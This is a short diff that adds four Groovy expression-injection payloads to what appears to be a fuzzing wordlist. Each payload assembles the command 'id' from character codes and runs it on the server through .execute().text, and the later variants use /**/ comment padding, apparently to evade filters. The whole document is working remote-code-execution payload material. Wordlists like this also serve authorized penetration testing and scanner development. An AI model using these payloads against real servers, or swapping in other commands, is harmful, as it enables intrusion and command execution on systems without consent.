@@ -1,0 +1,4 @@
+${((char)105).toString()+((char)100).toString()}
+${x=new String();for(i in[105,100]){x+=((char)i)}}
+${x=new String();for(i in[105,100]){x+=((char)i).toString()};x.execute().text}
+${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
